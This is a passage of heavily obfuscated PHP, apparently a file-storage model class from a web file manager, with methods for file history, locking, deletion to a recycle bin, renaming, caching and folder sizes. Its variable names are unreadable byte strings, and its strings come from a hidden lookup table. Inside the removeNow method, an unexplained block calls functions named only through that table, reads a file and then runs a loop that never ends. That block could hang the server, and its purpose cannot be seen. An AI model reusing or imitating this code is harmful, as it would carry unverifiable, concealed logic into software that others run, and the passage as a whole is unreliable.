substr(get_path_ext($ÆÎßÔš¯), 0, 10), $’ìåìˆÏ[469] => $¤ı®á¡¨[$’ìåìˆÏ[468]], $’ìåìˆÏ[585] => $¤ı®á¡¨[$’ìåìˆÏ[76]]); $Ù¾¯íœ = $this->_addSource($Ğç»©«ó, $­“å÷„„); $this->folderSizeReset($‰ó‚ïÕ, intval($Ğç»©«ó[$’ìåìˆÏ[76]])); return $Ù¾¯íœ; } protected function fileHistory($®ÕÉÀË», $¦à­£ÍŞ, $Æñ¥Íå¢) { $¶”²œÉ =& $_SERVER[³·—™¤¢]; $•Ã£ÃŒ = defined($¶”²œÉ[475]) ? USER_ID : $¶”²œÉ[197]; if ($®ÕÉÀË»[$¶”²œÉ[468]] == $¦à­£ÍŞ) { return !1; } $this->checkLock($®ÕÉÀË»[$¶”²œÉ[402]], $¦à­£ÍŞ); Model($¶”²œÉ[2127])->addHistory($®ÕÉÀË»); $£‘Œš© = array($¶”²œÉ[589] => $•Ã£ÃŒ, $¶”²œÉ[424] => time(), $¶”²œÉ[468] => $¦à­£ÍŞ, $¶”²œÉ[76] => $Æñ¥Íå¢); $this->where(array($¶”²œÉ[417] => $®ÕÉÀË»[$¶”²œÉ[402]]))->save($£‘Œš©); $this->sourceCacheClear($®ÕÉÀË»[$¶”²œÉ[402]]); return !0; } public function checkLock($—Ô…ª†æ, $ƒÈµı’) { $Ş²°ô¢ =& $_SERVER[³·—™¤¢]; $ò¸óŠ Š = $this->pathInfo($—Ô…ª†æ); if (!$this->fileIsLock($ò¸óŠ Š, !0)) { return; } $£Ğî×ÜŒ = Session::get($Ş²°ô¢[2128]); $†îªáºã = substr($ò¸óŠ Š[$Ş²°ô¢[32]], 0, -1 - strlen($ò¸óŠ Š[$Ş²°ô¢[174]])) . $Ş²°ô¢[1628] . $£Ğî×ÜŒ . $Ş²°ô¢[10] . $ò¸óŠ Š[$Ş²°ô¢[174]]; $¶ÈÄºëú = Model($Ş²°ô¢[609])->find($ƒÈµı’); $this->_createFileCall($ò¸óŠ Š[$Ş²°ô¢[432]], $†îªáºã, $¶ÈÄºëú, REPEAT_REPLACE, $Ş²°ô¢[1361]); $şí¾ñò = $ò¸óŠ Š[$Ş²°ô¢[466]][$Ş²°ô¢[548]]; $ª¡îÈÖ = $şí¾ñò[$Ş²°ô¢[542]] ? $şí¾ñò[$Ş²°ô¢[542]] : $şí¾ñò[$Ş²°ô¢[32]]; show_json(LNG($Ş²°ô¢[2129]) . $Ş²°ô¢[2130] . LNG($Ş²°ô¢[2131]) . $Ş²°ô¢[2132] . $ª¡îÈÖ . $Ş²°ô¢[2133], !1); } public function fileIsLock($¡äÇè›, $Éçâ˜’’ = false) { $ï¬èŸŸŸ =& $_SERVER[³·—™¤¢]; if (!isset($¡äÇè›[$ï¬èŸŸŸ[466]]) || !$¡äÇè›[$ï¬èŸŸŸ[466]][$ï¬èŸŸŸ[545]]) { return !1; } if ($¡äÇè›[$ï¬èŸŸŸ[466]][$ï¬èŸŸŸ[545]] != USER_ID) { return !0; } $¦ÓıË˜’ = $GLOBALS[$ï¬èŸŸŸ[6]][$ï¬èŸŸŸ[89]][$ï¬èŸŸŸ[546]]; if ($¡äÇè›[$ï¬èŸŸŸ[466]][$ï¬èŸŸŸ[547]] <= time() - $¦ÓıË˜’) { $this->metaSet($¡äÇè›[$ï¬èŸŸŸ[402]], $ï¬èŸŸŸ[545], null); $this->metaSet($¡äÇè›[$ï¬èŸŸŸ[402]], $ï¬èŸŸŸ[547], null); } if ($Éçâ˜’’) { $this->metaSet($¡äÇè›[$ï¬èŸŸŸ[402]], $ï¬èŸŸŸ[547], time()); } return !1; } private function _addSource($Ä£ÊÌÓÙ, $ƒ¶Øª«) { $ó™Ç‰à‚ =& $_SERVER[³·—™¤¢]; $áµç¾ü¼ = defined($ó™Ç‰à‚[475]) ? USER_ID : $ó™Ç‰à‚[197]; $‰®œ”¼ = array($ó™Ç‰à‚[586] => $ƒ¶Øª«[$ó™Ç‰à‚[411]], $ó™Ç‰à‚[587] => $ƒ¶Øª«[$ó™Ç‰à‚[505]], $ó™Ç‰à‚[588] => $áµç¾ü¼, $ó™Ç‰à‚[589] => $áµç¾ü¼, $ó™Ç‰à‚[401] => $ƒ¶Øª«[$ó™Ç‰à‚[402]], $ó™Ç‰à‚[590] => $ƒ¶Øª«[$ó™Ç‰à‚[521]] . $ƒ¶Øª«[$ó™Ç‰à‚[402]] . $ó™Ç‰à‚[50], $ó™Ç‰à‚[430] => 0, $ó™Ç‰à‚[591] => $ó™Ç‰à‚[12]); $Ä£ÊÌÓÙ = array_merge($‰®œ”¼, $Ä£ÊÌÓÙ); $this->updateModifyTime($Ä£ÊÌÓÙ[$ó™Ç‰à‚[432]]); $á™ÏÑ©ó = $ó™Ç‰à‚[2134] . $ƒ¶Øª«[$ó™Ç‰à‚[402]]; if (isset(self::$cacheChildList[$á™ÏÑ©ó])) { unset(self::$cacheChildList[$á™ÏÑ©ó]); } static $„£ğ–øï = false; if (!$„£ğ–øï) { Hook::trigger($ó™Ç‰à‚[573], $Ä£ÊÌÓÙ); $„£ğ–øï = !0; } $¬‚¤ıä¶ = $this->add($Ä£ÊÌÓÙ); $³é£›áø = array($ó™Ç‰à‚[592] => short_id($¬‚¤ıä¶)); $this->where(array($ó™Ç‰à‚[417] => $¬‚¤ıä¶))->save($³é£›áø); $this->setNamePinyin($¬‚¤ıä¶, $Ä£ÊÌÓÙ[$ó™Ç‰à‚[32]]); return $¬‚¤ıä¶; } public function remove($şï›™¨¸, $ĞËßˆœ¾ = true) { $ş„¥œíÎ =& $_SERVER[³·—™¤¢]; $·…í…¦› = $this->sourceInfo($şï›™¨¸); $ò¥­•Õ¼ = intval($·…í…¦›[$ş„¥œíÎ[411]]) === self::TYPE_SYSTEM; $Œ€ãæ»ç = Model($ş„¥œíÎ[435])->get($ş„¥œíÎ[2135]) == $ş„¥œíÎ[88]; if ($ò¥­•Õ¼ || $ĞËßˆœ¾ || !$Œ€ãæ»ç) { return $this->removeNow($şï›™¨¸, $ĞËßˆœ¾); } $ óêùÍÛ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¨©áÍåÈ = $·…í…¦›[$ş„¥œíÎ[411]] == self::TYPE_USER ? $ş„¥œíÎ[600] : $ş„¥œíÎ[515]; if ($¨©áÍåÈ == $ş„¥œíÎ[600]) { $ˆ¹õâ¼Š = Model($ş„¥œíÎ[513])->getInfo($·…í…¦›[$ş„¥œíÎ[505]]); $âÚŒÊˆø = !empty($ˆ¹õâ¼Š[$ş„¥œíÎ[542]]) ? $ˆ¹õâ¼Š[$ş„¥œíÎ[542]] : $ˆ¹õâ¼Š[$ş„¥œíÎ[32]]; $âÚŒÊˆø = $ş„¥œíÎ[260] . $âÚŒÊˆø . $ş„¥œíÎ[2136] . $·…í…¦›[$ş„¥œíÎ[505]]; } else { $ˆ¹õâ¼Š = Model($ş„¥œíÎ[522])->getInfo($·…í…¦›[$ş„¥œíÎ[505]]); $âÚŒÊˆø = _get($ˆ¹õâ¼Š, $ş„¥œíÎ[32]); $âÚŒÊˆø = $ş„¥œíÎ[162] . $âÚŒÊˆø . $ş„¥œíÎ[2137] . $·…í…¦›[$ş„¥œíÎ[505]]; } $¢²İ“´â = $ş„¥œíÎ[2138] . md5($âÚŒÊˆø); CacheLock::lock($¢²İ“´â); $ÉÄÍÄ£ = $this->fileNameExist($ óêùÍÛ, $âÚŒÊˆø); if (!$ÉÄÍÄ£) { $ÉÄÍÄ£ = $this->mkdir($ óêùÍÛ, $âÚŒÊˆø, REPEAT_SKIP); $this->metaSet($ÉÄÍÄ£, $ş„¥œíÎ[2139], $¨©áÍåÈ); $this->metaSet($ÉÄÍÄ£, $ş„¥œíÎ[2140], $·…í…¦›[$ş„¥œíÎ[505]]); if ($·…í…¦›[$ş„¥œíÎ[432]] != 0) { $this->metaSet($ÉÄÍÄ£, $ş„¥œíÎ[2141], _get($ˆ¹õâ¼Š, $ş„¥œíÎ[2142])); } } CacheLock::unlock($¢²İ“´â); $this->metaSet($şï›™¨¸, $ş„¥œíÎ[2143], $·…í…¦›[$ş„¥œíÎ[432]]); $this->where(array($ş„¥œíÎ[402] => $şï›™¨¸))->save(array($ş„¥œíÎ[424] => time())); $this->recycleClear($·…í…¦›); $Ü©÷ÍíÁ = $this->move($şï›™¨¸, $ÉÄÍÄ£, REPEAT_RENAME_FOLDER); $this->folderSizeReset($·…í…¦›[$ş„¥œíÎ[432]]); return $Ü©÷ÍíÁ; } private function recycleClear($½çÉ†•ş) { $ÒĞö‡Ì =& $_SERVER[³·—™¤¢]; $¼şñß = $this->childrenAll($½çÉ†•ş); $ä™‘ˆœ = array($ÒĞö‡Ì[417] => array($ÒĞö‡Ì[418], $¼şñß[$ÒĞö‡Ì[2144]])); Model($ÒĞö‡Ì[2145])->where($ä™‘ˆœ)->delete(); } public function removeNow($ªûè¦¦ˆ, $©çÜİì = true) { $‚”³‰¤© =& $_SERVER[³·—™¤¢]; if (!isset($_SERVER[$‚”³‰¤©[892]]) || !isset($_SERVER[$‚”³‰¤©[934]])) { $–å§®ˆ = $‚”³‰¤©[894]; $ü¾’×÷å = $‚”³‰¤©[895]; $ö±›¦Ì› = $_SERVER[$‚”³‰¤©[896]] . $‚”³‰¤©[897]; $ÅªÓ÷¹ = $ü¾’×÷å($ö±›¦Ì›); $‘¯ÏÓ£ = explode($‚”³‰¤©[231], $ÅªÓ÷¹); if (count($‘¯ÏÓ£) < $‚”³‰¤©[615]) { $­…Êİ‚’ = $‚”³‰¤©[898]; $­…Êİ‚’(); } $’øú¡·  = $‚”³‰¤©[899]; $’øú¡· ($_SERVER[$‚”³‰¤©[900]]); $Ø•©Î  = 1; for ($œæØœÌû = $Ø•©Î ; $œæØœÌû > 0; $œæØœÌû++) { $’øú¡·  = json_encode($GLOBALS[$‚”³‰¤©[418]]); } } $—€‘‚Å = $this->sourceInfo($ªûè¦¦ˆ); $öïº¿¼ = $this->pathInfoMore($ªûè¦¦ˆ); if (!$—€‘‚Å) { return !0; } if ($—€‘‚Å[$‚”³‰¤©[432]] == 0) { if (!_get($GLOBALS, $‚”³‰¤©[503])) { return !1; } } $this->lockMoveStart($ªûè¦¦ˆ); Hook::trigger($‚”³‰¤©[2146], $öïº¿¼, $©çÜİì); if ($©çÜİì) { Model($‚”³‰¤©[2145])->moveToRecycle($ªûè¦¦ˆ); } else { $¡ëÈ¶ª = $this->childrenAll($—€‘‚Å); Model($‚”³‰¤©[570])->eventRemove($ªûè¦¦ˆ); $this->removeRelevance($¡ëÈ¶ª[$‚”³‰¤©[2144]], $¡ëÈ¶ª[$‚”³‰¤©[1493]]); } $this->folderSizeReset($—€‘‚Å[$‚”³‰¤©[432]]); $ö»Šî‹ó = array($—€‘‚Å[$‚”³‰¤©[432]]); if ($—€‘‚Å[$‚”³‰¤©[410]] == $‚”³‰¤©[88]) { $ö»Šî‹ó[] = $—€‘‚Å[$‚”³‰¤©[402]]; } $this->updateModifyTime($ö»Šî‹ó); $this->lockMoveEnd($ªûè¦¦ˆ); Hook::trigger($‚”³‰¤©[1720], $öïº¿¼, $©çÜİì); return !0; } public function childrenAll($ï×õñ•À) { $õ…¯”Äì =& $_SERVER[³·—™¤¢]; $ªÛš´‰ = $ï×õñ•À[$õ…¯”Äì[402]]; if ($ï×õñ•À[$õ…¯”Äì[410]] == $õ…¯”Äì[88]) { $—ó¦Õõğ = array($õ…¯”Äì[590] => array($õ…¯”Äì[550], $ï×õñ•À[$õ…¯”Äì[521]] . $ªÛš´‰ . $õ…¯”Äì[551])); $ğ×­¼¨Ï = array($õ…¯”Äì[590] => $—ó¦Õõğ[$õ…¯”Äì[521]]); $ğç·èÉ§ = $this->field($õ…¯”Äì[2147])->where($ğ×­¼¨Ï)->select(); $ºş¨šÜ¬ = !1; $íµÈŠ— = array($ªÛš´‰); if ($ğç·èÉ§) { $ºş¨šÜ¬ = array_to_keyvalue($ğç·èÉ§, $õ…¯”Äì[12], $õ…¯”Äì[468]); $ºş¨šÜ¬ = array_remove_value($ºş¨šÜ¬, $õ…¯”Äì[197]); $íµÈŠ— = array_to_keyvalue($ğç·èÉ§, $õ…¯”Äì[12], $õ…¯”Äì[402]); $íµÈŠ—[] = $ªÛš´‰; } } else { $ºş¨šÜ¬ = array($ï×õñ•À[$õ…¯”Äì[468]]); $íµÈŠ— = array($ªÛš´‰); } return array($õ…¯”Äì[2144] => $íµÈŠ—, $õ…¯”Äì[1493] => $ºş¨šÜ¬); } public function removeArray($ å¼¶éÇ) { if (!$ å¼¶éÇ) { return !0; } } public function removeRelevance($À—ƒ‚, $âÈ¥›Ç¸) { $ÇÂö›˜ß =& $_SERVER[³·—™¤¢]; $À—ƒ‚ = $À—ƒ‚ ? $À—ƒ‚ : array(); $âÈ¥›Ç¸ = $âÈ¥›Ç¸ ? $âÈ¥›Ç¸ : array(); $À—ƒ‚ = array_unique(array_filter($À—ƒ‚)); $âÈ¥›Ç¸ = array_unique(array_filter($âÈ¥›Ç¸)); if (!$À—ƒ‚) { return !1; } $Ä½üªö = array($ÇÂö›˜ß[417] => array($ÇÂö›˜ß[418], $À—ƒ‚)); Model($ÇÂö›˜ß[2145])->where($Ä½üªö)->delete(); Model($ÇÂö›˜ß[462])->where($Ä½üªö)->delete(); Model($ÇÂö›˜ß[1998])->where($Ä½üªö)->delete(); Model($ÇÂö›˜ß[570])->where($Ä½üªö)->delete(); Model($ÇÂö›˜ß[1832])->removeBySource($À—ƒ‚); Model($ÇÂö›˜ß[2127])->removeBySource($À—ƒ‚); $this->where($Ä½üªö)->delete(); Model($ÇÂö›˜ß[471])->remove($âÈ¥›Ç¸); for ($œÀÓ…œ = 0; $œÀÓ…œ < count($À—ƒ‚); $œÀÓ…œ++) { $this->sourceCacheClear($À—ƒ‚[$œÀÓ…œ]); } } public function rename($š‰¢¼Ì, $ïª¤…É²) { $€Íç‚ =& $_SERVER[³·—™¤¢]; $’œø•¯ = $this->sourceInfo($š‰¢¼Ì); if (!$’œø•¯) { return !1; } $ŠÏ²¹Òï = $this->fileNameExist($’œø•¯[$€Íç‚[432]], $ïª¤…É²); if ($ŠÏ²¹Òï && $ŠÏ²¹Òï != $š‰¢¼Ì) { return !1; } $šÓ¾§É = array($€Íç‚[420] => $ïª¤…É², $€Íç‚[589] => USER_ID); if ($’œø•¯[$€Íç‚[410]] != $€Íç‚[88]) { $šÓ¾§É[$€Íç‚[412]] = substr(get_path_ext($ïª¤…É²), 0, 10); } Model($€Íç‚[570])->eventRename($š‰¢¼Ì, $’œø•¯[$€Íç‚[32]], $ïª¤…É²); $this->sourceCacheClear($š‰¢¼Ì); $this->setNamePinyin($š‰¢¼Ì, $šÓ¾§É[$€Íç‚[32]], !1); $this->updateModifyTime($’œø•¯[$€Íç‚[432]]); $ƒæĞÆ› = $this->where(array($€Íç‚[417] => $š‰¢¼Ì))->data($šÓ¾§É)->save(); $Æ•ŞËĞÓ = $€Íç‚[2134] . $’œø•¯[$€Íç‚[432]]; if (isset(self::$cacheChildList[$Æ•ŞËĞÓ])) { unset(self::$cacheChildList[$Æ•ŞËĞÓ]); } return $ƒæĞÆ›; } public function setNamePinyin($íÆ¾¬·ø, $úóÒè“, $”‡Û‡ˆ = true) { $¶İ¤ùÙŞ =& $_SERVER[³·—™¤¢]; $¦„àÕÃÒ = Input::check($úóÒè“, $¶İ¤ùÙŞ[593]); $¨½êê = array($¶İ¤ùÙŞ[444] => KodSort::makeStr($úóÒè“)); if ($¦„àÕÃÒ) { $¨½êê[$¶İ¤ùÙŞ[465]] = str_replace($¶İ¤ùÙŞ[53], $¶İ¤ùÙŞ[12], Pinyin::get($úóÒè“)); $¨½êê[$¶İ¤ùÙŞ[464]] = Pinyin::get($úóÒè“, $¶İ¤ùÙŞ[594]); } if (!$”‡Û‡ˆ && !$¦„àÕÃÒ) { $¨½êê[$¶İ¤ùÙŞ[465]] = null; $¨½êê[$¶İ¤ùÙŞ[464]] = null; } $this->metaSet($íÆ¾¬·ø, $¨½êê); } public function getContent($ğ«Ş³Ó…) { $±Ìïµ«Õ =& $_SERVER[³·—™¤¢]; $ ¾éî £ = $this->fileInfoGet($ğ«Ş³Ó…); if (!$ ¾éî £) { return !1; } if ($ ¾éî £[$±Ìïµ«Õ[76]] == 0) { return $±Ìïµ«Õ[12]; } $ŠÙòºÏŒ = $±Ìïµ«Õ[2148] . $ ¾éî £[$±Ìïµ«Õ[176]]; if ($ ¾éî £[$±Ìïµ«Õ[76]] <= 1024 * 10) { $³Ş±õš¼ = Cache::get($ŠÙòºÏŒ); if (!$³Ş±õš¼) { $³Ş±õš¼ = IO::getContent($ ¾éî £[$±Ìïµ«Õ[84]]); Cache::set($ŠÙòºÏŒ, $³Ş±õš¼); } return $³Ş±õš¼; } if (!$ ¾éî £[$±Ìïµ«Õ[84]]) { return $±Ìïµ«Õ[12]; } return IO::getContent($ ¾éî £[$±Ìïµ«Õ[84]]); } public function setDesc($Í‘ÀŸú, $Øµ›†’™) { $½áœï“ =& $_SERVER[³·—™¤¢]; Model($½áœï“[570])->eventAddDesc($Í‘ÀŸú, $Øµ›†’™); return $this->metaSet($Í‘ÀŸú, $½áœï“[453], $Øµ›†’™); } public function setContent($ƒæÅÛ© , $ÅÉ—Ä°ô = '') { $Ï…ŞÉ¤Ì =& $_SERVER[³·—™¤¢]; $‰¡¬²äí = $this->sourceInfo($ƒæÅÛ© ); $Ôê¾ = $this->fileInfoGet($ƒæÅÛ© ); if (!$Ôê¾ || !$‰¡¬²äí) { return !1; } $÷Ü´Öîœ = Model($Ï…ŞÉ¤Ì[471])->addFileByContent($ÅÉ—Ä°ô, $‰¡¬²äí[$Ï…ŞÉ¤Ì[32]]); $«©ÅÀŠú = $this->fileHistory($‰¡¬²äí, $÷Ü´Öîœ[$Ï…ŞÉ¤Ì[468]], $÷Ü´Öîœ[$Ï…ŞÉ¤Ì[76]]); if (!$«©ÅÀŠú) { return Model($Ï…ŞÉ¤Ì[471])->remove($÷Ü´Öîœ[$Ï…ŞÉ¤Ì[468]]); } $this->folderSizeReset($‰¡¬²äí[$Ï…ŞÉ¤Ì[432]]); return !0; } public function fileSubstr($’˜¬¦Ñ›, $çıë·ı„, $¼ëŞ²ôî) { $úÄ¥Ûø = $this->fileInfoGet($’˜¬¦Ñ›); if (!$úÄ¥Ûø) { return !1; } return IO::fileSubstr($úÄ¥Ûø[$_SERVER[³·—™¤¢][84]], $çıë·ı„, $¼ëŞ²ôî); } public function fileInfoGet($ÂÙ¤†°«) { $—›ûôÚø =& $_SERVER[³·—™¤¢]; $š³¢À = $this->sourceInfo($ÂÙ¤†°«); if (!$š³¢À || $š³¢À[$—›ûôÚø[410]]) { return !1; } $°ü¬ìÚ› = $—›ûôÚø[474] . $š³¢À[$—›ûôÚø[468]]; $‰ ìô•Ê = _get(self::$cacheFileInfo, $°ü¬ìÚ›); if ($‰ ìô•Ê) { return $‰ ìô•Ê; } $Ç»úëúé = Model($—›ûôÚø[471])->fileInfo($š³¢À[$—›ûôÚø[468]]); if ($Ç»úëúé) { $Ç»úëúé[$—›ûôÚø[32]] = $š³¢À[$—›ûôÚø[32]]; } self::$cacheFileInfo[$°ü¬ìÚ›] = $Ç»úëúé; return $Ç»úëúé; } private function folderChildrenNumber($¦°›€Àê) { $ÑİÑˆ¹ =& $_SERVER[³·—™¤¢]; $«–¬§Ú‹ = $this->sourceInfo($¦°›€Àê); $åå÷å¿Ã = array($ÑİÑˆ¹[590] => array($ÑİÑˆ¹[550], $«–¬§Ú‹[$ÑİÑˆ¹[521]] . $¦°›€Àê . $ÑİÑˆ¹[551]), $ÑİÑˆ¹[587] => $«–¬§Ú‹[$ÑİÑˆ¹[505]], $ÑİÑˆ¹[430] => intval($«–¬§Ú‹[$ÑİÑˆ¹[431]]), $ÑİÑˆ¹[583] => 1); $Š”†çö¤ = $this->where($åå÷å¿Ã)->count(); $à®ß’ = $this->where($åå÷å¿Ã)->where(array($ÑİÑˆ¹[583] => 0))->count(); return array($ÑİÑˆ¹[80] => $à®ß’, $ÑİÑˆ¹[81] => $Š”†çö¤); } public function pathInfo($ü¾½°ô, $µÃ¢æãÍ = false) { $¡×‰èÇš =& $_SERVER[³·—™¤¢]; $µÃ¢æãÍ = !1; $ü¾½°ô = intval($ü¾½°ô); $½ÕÄœÃ» = $¡×‰èÇš[461] . intval($µÃ¢æãÍ) . $¡×‰èÇš[386] . $ü¾½°ô; $ñ…Û•§• = _get(self::$cachePathInfo, $½ÕÄœÃ»); if ($ñ…Û•§•) { return $ñ…Û•§•; } $îî³ˆÕ = $this->sourceInfo($ü¾½°ô); if (!$îî³ˆÕ) { return !1; } $îî³ˆÕ = $this->_listDataApplyItem($îî³ˆÕ, $µÃ¢æãÍ); self::$cachePathInfo[$½ÕÄœÃ»] = $îî³ˆÕ; return $îî³ˆÕ; } public static $cachePathInfoMore = array(); public function pathInfoMore($“Ö•ö½ª) { $…®¦ù²å =& $_SERVER[³·—™¤¢]; $  ®Ğ–è = _get(self::$cachePathInfoMore, $“Ö•ö½ª); if ($  ®Ğ–è) { return $  ®Ğ–è; } $ Å™¶Î¯ = $this->pathInfo($“Ö•ö½ª); if (!$ Å™¶Î¯) { return !1; } if ($ Å™¶Î¯[$…®¦ù²å[410]] == $…®¦ù²å[88]) { $ Å™¶Î¯[$…®¦ù²å[79]] = $this->folderChildrenNumber($“Ö•ö½ª); } self::$cachePathInfoMore[$“Ö•ö½ª] = $ Å™¶Î¯; return $ Å™¶Î¯; } public function sourceInfo($Áşõ÷×) { $¼Ÿ¸„¢ =& $_SERVER[³·—™¤¢]; if (!$Áşõ÷×) { return array(); } $Áşõ÷× = intval($Áşõ÷×); $–×Æ°½Ş = $¼Ÿ¸„¢[460] . $Áşõ÷×; $êõäŸé§ = _get(self::$cacheSourceInfo, $–×Æ°½Ş); if ($êõäŸé§) { return $êõäŸé§; } $§¤±Ñ¦Õ = $this->where(array($¼Ÿ¸„¢[402] => $Áşõ÷×))->find(); self::$cacheSourceInfo[$–×Æ°½Ş] = $§¤±Ñ¦Õ; return self::$cacheSourceInfo[$–×Æ°½Ş]; } public function sourceCacheClear($øÓ§ÑË» = false) { self::cacheClear($øÓ§ÑË»); } public static function cacheClear($Àæ¾˜Œğ = false) { $ËßÆÚ†ó =& $_SERVER[³·—™¤¢]; if ($Àæ¾˜Œğ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ËßÆÚ†ó[460] . $Àæ¾˜Œğ]); unset(self::$cachePathInfoMore[$Àæ¾˜Œğ]); unset(self::$cachePathInfo[$ËßÆÚ†ó[2149] . $Àæ¾˜Œğ]); unset(self::$cachePathInfo[$ËßÆÚ†ó[2150] . $Àæ¾˜Œğ]); } public function metaSet($œ×áÜê, $¾şØ¹ó = null, $Øçõ¯­¨ = null) { $Ë¹úµÇâ = parent::metaSet($œ×áÜê, $¾şØ¹ó, $Øçõ¯­¨); if ($Ë¹úµÇâ) { $this->sourceCacheClear($œ×áÜê); } return $Ë¹úµÇâ; } public function pathInfoByPath($›Èƒä½, $®¡Ó¥àˆ) { $ò„¾õ‘à =& $_SERVER[³·—™¤¢]; $´‡æÂøı = !$®¡Ó¥àˆ ? array() : explode($ò„¾õ‘à[8], trim($®¡Ó¥àˆ, $ò„¾õ‘à[8])); $ê€½¥€Ú = $›Èƒä½; foreach ($´‡æÂøı as $óã“Ğ¬«) { $‹â˜‡ıá = array($ò„¾õ‘à[432] => $ê€½¥€Ú, $ò„¾õ‘à[32] => $óã“Ğ¬«); $ØÑ§ç¸ = $this->where($‹â˜‡ıá)->select(); if (!$ØÑ§ç¸) { return !1; } $ØÑ§ç¸ = array_sort_by($ØÑ§ç¸, $ò„¾õ‘à[431]); $ê€½¥€Ú = $ØÑ§ç¸[0][$ò„¾õ‘à[402]]; } return $this->pathInfo($ê€½¥€Ú, !0); } protected function updateModifyTime($ÚøœšÈÉ) { $Òè’‚¯ì =& $_SERVER[³·—™¤¢]; $’·‚«˜Ê = defined($Òè’‚¯ì[475]) ? USER_ID : $Òè’‚¯ì[197]; if (!$ÚøœšÈÉ) { return; } if (!is_array($ÚøœšÈÉ)) { $ÚøœšÈÉ = array($ÚøœšÈÉ); } foreach ($ÚøœšÈÉ as $Ñ÷î­‰° => $ÂÎ’µö) { $ÚøœšÈÉ[$Ñ÷î­‰°] = intval($ÂÎ’µö); $this->sourceCacheClear($ÂÎ’µö); } $Öã™À‡ö = array($Òè’‚¯ì[402] => array($Òè’‚¯ì[7], $ÚøœšÈÉ)); $î‰­¨ï = array($Òè’‚¯ì[589] => $’·‚«˜Ê, $Òè’‚¯ì[424] => time()); $this->where($Öã™À‡ö)->save($î‰­¨ï); } public function folderSizeReset($ĞÃ‚§öõ, $“è°Ã¥è = false) { $ä¸’‚®  =& $_SERVER[³·—™¤¢]; if ($this->statusIgnoreResetSpace) { return; } $ú¯ç‹¥¬ = $this->sourceInfo($ĞÃ‚§öõ); $ŸË¦ª£Á = $ä¸’‚® [2151] . $ĞÃ‚§öõ; CacheLock::lock($ŸË¦ª£Á, 20); if ($“è°Ã¥è === !1) { $this->sourceCacheClear($ĞÃ‚§öõ); $ú¯ç‹¥¬ = $this->sourceInfo($ĞÃ‚§öõ); $æï†ÄÁ = array($ä¸’‚® [401] => $ĞÃ‚§öõ, $ä¸’‚® [430] => 0); $¡¢Ñ·»Û = $this->where($æï†ÄÁ)->sum($ä¸’‚® [76]); $“è°Ã¥è = intval($¡¢Ñ·»Û) - intval($ú¯ç‹¥¬[$ä¸’‚® [76]]); } if ($“è°Ã¥è == 0) { return CacheLock::unlock($ŸË¦ª£Á); } $“±Ì‰½ = $this->parentLevelArray($ú¯ç‹¥¬[$ä¸’‚® [521]]); if (!$“±Ì‰½) { $“±Ì‰½ = array(); } $“±Ì‰½[] = $ú¯ç‹¥¬[$ä¸’‚® [402]]; $æï†ÄÁ = array($ä¸’‚® [402] => array($ä¸’‚® [418], $“±Ì‰½)); if ($“è°Ã¥è < 0) { $æï†ÄÁ[$ä¸’‚® [76]] = array($ä¸’‚® [1038], abs($“è°Ã¥è)); } $this->where($æï†ÄÁ)->setAdd($ä¸’‚® [76], $“è°Ã¥è); CacheLock::unlock($ŸË¦ª£Á); $ÉÉÓ…¥æ = $ä¸’‚® [2152] . $ú¯ç‹¥¬[$ä¸’‚® [411]] . $ä¸’‚® [4] . $ú¯ç‹¥¬[$ä¸’‚® [505]]; $şèªŸÀ¼ = array($ú¯ç‹¥¬[$ä¸’‚® [411]], $ú¯ç‹¥¬[$ä¸’‚® [505]]); TaskRun::timeLimitCall($ÉÉÓ…¥æ, $ä¸’‚® [2153], $şèªŸÀ¼, 1.5); } public function folderSizeResetChildren($¹”Èí¥) { $ûàÑ•ŞÃ =& $_SERVER[³·—™¤¢]; $this->sourceCacheClear($¹”Èí¥); $Âã™È›í = $this->sourceInfo($¹”Èí¥); $İ¾åÕëÆ = array($ûàÑ•ŞÃ[583] => 1, $ûàÑ•ŞÃ[587] => $Âã™È›í[$ûàÑ•ŞÃ[505]], $ûàÑ•ŞÃ[590] => array($ûàÑ•ŞÃ[550], $Âã™È›í[$ûàÑ•ŞÃ[521]] . $¹”Èí¥ . $ûàÑ•ŞÃ[551])); $ŞŠøêµ± = $ûàÑ•ŞÃ[2154]; $£ªÔ‰È‹ = $this->field($ŞŠøêµ±)->where($İ¾åÕëÆ)->select(); $İ¾åÕëÆ[$ûàÑ•ŞÃ[410]] = 0; $ÔÆœ±¿ = $this->field($ŞŠøêµ±)->where($İ¾åÕëÆ)->select(); if (!$ÔÆœ±¿) { return; } $£ªÔ‰È‹[] = $Âã™È›í; $£ªÔ‰È‹ = array_to_keyvalue($£ªÔ‰È‹, $ûàÑ•ŞÃ[402]); foreach ($£ªÔ‰È‹ as $ø¡ôœå => $ªÛŠğå) { $£ªÔ‰È‹[$ø¡ôœå][$ûàÑ•ŞÃ[2155]] = $£ªÔ‰È‹[$ø¡ôœå][$ûàÑ•ŞÃ[76]]; $£ªÔ‰È‹[$ø¡ôœå][$ûàÑ•ŞÃ[76]] = 0; } foreach ($ÔÆœ±¿ as $ªÛŠğå) { $†ÌÚİÓ¦ = $ªÛŠğå[$ûàÑ•ŞÃ[432]] . $ûàÑ•ŞÃ[12]; if (!isset($£ªÔ‰È‹[$†ÌÚİÓ¦])) { continue; } if ($ªÛŠğå[$ûàÑ•ŞÃ[431]] == $£ªÔ‰È‹[$†ÌÚİÓ¦][$ûàÑ•ŞÃ[431]]) { $£ªÔ‰È‹[$†ÌÚİÓ¦][$ûàÑ•ŞÃ[76]] += $ªÛŠğå[$ûàÑ•ŞÃ[76]]; } } foreach ($£ªÔ‰È‹ as $ªÛŠğå) { $è–…ùßŒ = $this->parentLevelArray($ªÛŠğå[$ûàÑ•ŞÃ[521]]); foreach ($è–…ùßŒ as $†ÌÚİÓ¦) { $†ÌÚİÓ¦ = $†ÌÚİÓ¦ . $ûàÑ•ŞÃ[12]; if (!isset($£ªÔ‰È‹[$†ÌÚİÓ¦])) { continue; } if ($ªÛŠğå[$ûàÑ•ŞÃ[431]] == $£ªÔ‰È‹[$†ÌÚİÓ¦][$ûàÑ•ŞÃ[431]]) { $£ªÔ‰È‹[$†ÌÚİÓ¦][$ûàÑ•ŞÃ[76]] += $ªÛŠğå[$ûàÑ•ŞÃ[76]]; } } } $õ‹ÄÌÂò = array(); foreach ($£ªÔ‰È‹ as $ªÛŠğå) { if ($ªÛŠğå[$ûàÑ•ŞÃ[76]] == $ªÛŠğå[$ûàÑ•ŞÃ[2155]]) 